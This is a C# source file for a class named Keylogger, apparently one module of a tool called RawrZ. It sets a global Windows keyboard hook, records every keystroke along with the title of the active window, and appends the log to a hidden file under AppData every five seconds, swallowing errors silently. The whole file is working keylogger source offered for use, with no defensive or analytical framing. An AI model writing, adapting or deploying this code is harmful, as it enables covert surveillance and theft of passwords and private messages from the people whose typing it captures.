using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using System.Collections.Generic;
using System.Text;
using System.IO;
using System.Security.Cryptography;

namespace RawrZDesktop.AdvancedModules
{
    public class Keylogger
    {
        private const int WH_KEYBOARD_LL = 13;
        private const int WM_KEYDOWN = 0x0100;
        private const int WM_SYSKEYDOWN = 0x0104;
        
        private static LowLevelKeyboardProc _proc = HookCallback;
        private static IntPtr _hookID = IntPtr.Zero;
        private static bool _isRunning = false;
        private static readonly StringBuilder _keyBuffer = new StringBuilder();
        private static readonly object _lockObject = new object();
        private static CancellationTokenSource? _cancellationTokenSource;

        private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        private static extern int GetAsyncKeyState(int vKey);

        [DllImport("user32.dll")]
        private static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll")]
        private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

        /// <summary>
        /// Starts the keylogger
        /// </summary>
        public static void StartKeylogger()
        {
            if (_isRunning) return;

            _isRunning = true;
            _cancellationTokenSource = new CancellationTokenSource();
            
            _hookID = SetHook(_proc);
            
            // Start buffer processing task
            Task.Run(() => ProcessKeyBuffer(_cancellationTokenSource.Token));
        }

        /// <summary>
        /// Stops the keylogger
        /// </summary>
        public static void StopKeylogger()
        {
            if (!_isRunning) return;

            _isRunning = false;
            _cancellationTokenSource?.Cancel();
            
            if (_hookID != IntPtr.Zero)
            {
                UnhookWindowsHookEx(_hookID);
                _hookID = IntPtr.Zero;
            }
        }

        /// <summary>
        /// Sets up the keyboard hook
        /// </summary>
        private static IntPtr SetHook(LowLevelKeyboardProc proc)
        {
            using var curProcess = System.Diagnostics.Process.GetCurrentProcess();
            using var curModule = curProcess.MainModule;
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, GetModuleHandle(curModule?.ModuleName ?? ""), 0);
        }

        /// <summary>
        /// Keyboard hook callback
        /// </summary>
        private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            if (nCode >= 0 && (wParam == (IntPtr)WM_KEYDOWN || wParam == (IntPtr)WM_SYSKEYDOWN))
            {
                int vkCode = Marshal.ReadInt32(lParam);
                ProcessKey(vkCode);
            }

            return CallNextHookEx(_hookID, nCode, wParam, lParam);
        }

        /// <summary>
        /// Processes captured key
        /// </summary>
        private static void ProcessKey(int vkCode)
        {
            lock (_lockObject)
            {
                var key = GetKeyString(vkCode);
                if (!string.IsNullOrEmpty(key))
                {
                    _keyBuffer.Append(key);
                    
                    // Add window title periodically
                    if (_keyBuffer.Length % 100 == 0)
                    {
                        var windowTitle = GetActiveWindowTitle();
                        if (!string.IsNullOrEmpty(windowTitle))
                        {
                            _keyBuffer.AppendLine($"\n[Window: {windowTitle}]\n");
                        }
                    }
                }
            }
        }

        /// <summary>
        /// Converts virtual key code to string
        /// </summary>
        private static string GetKeyString(int vkCode)
        {
            // Special keys
            switch (vkCode)
            {
                case 8: return "[BACKSPACE]";
                case 9: return "[TAB]";
                case 13: return "[ENTER]\n";
                case 16: return "[SHIFT]";
                case 17: return "[CTRL]";
                case 18: return "[ALT]";
                case 20: return "[CAPS]";
                case 27: return "[ESC]";
                case 32: return " ";
                case 46: return "[DEL]";
                case 91: return "[WIN]";
                case 92: return "[WIN]";
                case 144: return "[NUMLOCK]";
                case 145: return "[SCROLLLOCK]";
            }

            // Function keys
            if (vkCode >= 112 && vkCode <= 123)
            {
                return $"[F{vkCode - 111}]";
            }

            // Number keys
            if (vkCode >= 48 && vkCode <= 57)
            {
                return ((char)vkCode).ToString();
            }

            // Letter keys
            if (vkCode >= 65 && vkCode <= 90)
            {
                bool isShiftPressed = (GetAsyncKeyState(16) & 0x8000) != 0;
                bool isCapsLockOn = (GetAsyncKeyState(20) & 0x0001) != 0;
                
                if (isShiftPressed ^ isCapsLockOn)
                {
                    return ((char)vkCode).ToString();
                }
                else
                {
                    return ((char)(vkCode + 32)).ToString();
                }
            }

            // Numpad keys
            if (vkCode >= 96 && vkCode <= 105)
            {
                return (vkCode - 96).ToString();
            }

            return "";
        }

        /// <summary>
        /// Gets active window title
        /// </summary>
        private static string GetActiveWindowTitle()
        {
            try
            {
                const int nChars = 256;
                var buff = new StringBuilder(nChars);
                IntPtr handle = GetForegroundWindow();

                if (GetWindowText(handle, buff, nChars) > 0)
                {
                    return buff.ToString();
                }
            }
            catch
            {
                // Silently handle errors
            }

            return "";
        }

        /// <summary>
        /// Processes key buffer and saves to file
        /// </summary>
        private static async Task ProcessKeyBuffer(CancellationToken cancellationToken)
        {
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    string? bufferContent;
                    
                    lock (_lockObject)
                    {
                        if (_keyBuffer.Length > 0)
                        {
                            bufferContent = _keyBuffer.ToString();
                            _keyBuffer.Clear();
                        }
                        else
                        {
                            bufferContent = null;
                        }
                    }

                    if (!string.IsNullOrEmpty(bufferContent))
                    {
                        await SaveKeylog(bufferContent);
                    }

                    await Task.Delay(5000, cancellationToken); // Save every 5 seconds
                }
                catch
                {
                    await Task.Delay(10000, cancellationToken); // Wait longer on error
                }
            }
        }

        /// <summary>
        /// Saves keylog to file
        /// </summary>
        private static async Task SaveKeylog(string content)
        {
            try
            {
                var logPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "RawrZ", "keylog.txt");
                var logDir = Path.GetDirectoryName(logPath);
                
                if (!Directory.Exists(logDir) && !string.IsNullOrEmpty(logDir))
                {
                    Directory.CreateDirectory(logDir);
                }

                var timestamp = DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss");
                var logEntry = $"\n[{timestamp}]\n{content}\n";
                
                await File.AppendAllTextAsync(logPath, logEntry);
            }
            catch
            {
                // Silently handle errors
            }
        }

        /// <summary>
        /// Gets current keylog content
        /// </summary>
        public static string GetCurrentKeylog()
        {
            lock (_lockObject)
            {
                return _keyBuffer.ToString();
            }
        }

        /// <summary>
        /// Clears current keylog buffer
        /// </summary>
        public static void ClearKeylog()
        {
            lock (_lockObject)
            {
                _keyBuffer.Clear();
            }
        }

        /// <summary>
        /// Gets whether the keylogger is currently running
        /// </summary>
        public static bool IsRunning => _isRunning;

        /// <summary>
        /// Gets the current keylog count
        /// </summary>
        public static int GetKeylogCount()
        {
            lock (_lockObject)
            {
                return _keyBuffer.Length;
            }
        }
    }
}
